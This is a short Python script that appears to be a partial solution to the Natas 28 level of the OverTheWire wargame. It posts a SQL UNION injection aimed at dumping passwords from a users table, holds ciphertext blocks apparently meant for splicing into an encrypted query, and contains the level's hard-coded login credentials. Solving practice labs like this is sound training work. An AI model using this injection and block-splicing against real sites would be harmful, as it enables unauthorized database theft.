import requests
from requests.auth import HTTPBasicAuth
import time
import urllib.parse
import string
database = "abc123'"+'"'+'\\' 
ps28 = '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj'
user = 'natas28'
basicAuth=HTTPBasicAuth(user,ps28)
url= "http://natas28.natas.labs.overthewire.org/" 
header = {'Content-Type': 'application/x-www-form-urlencoded' }
atm = "query=" + 'a'*9+"' UNION SELECT ALL password FROM users; -- "
r = requests.post(url, headers=header, data=atm, auth=basicAuth)
print(urllib.parse.unquote(r.url)[60:])
print(len(urllib.parse.unquote(r.url)[60:]))
head = 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP'
dummy = 'ItlMM3qTizkRB5P2zYxJsb'
inj  = 'WY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K'
inj2 = 'r0T1ii+Ysw9O0BMRL2Q9HUY+Hp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O'
inj3 = '+76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons='
tail = 'c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI='
#print(atm)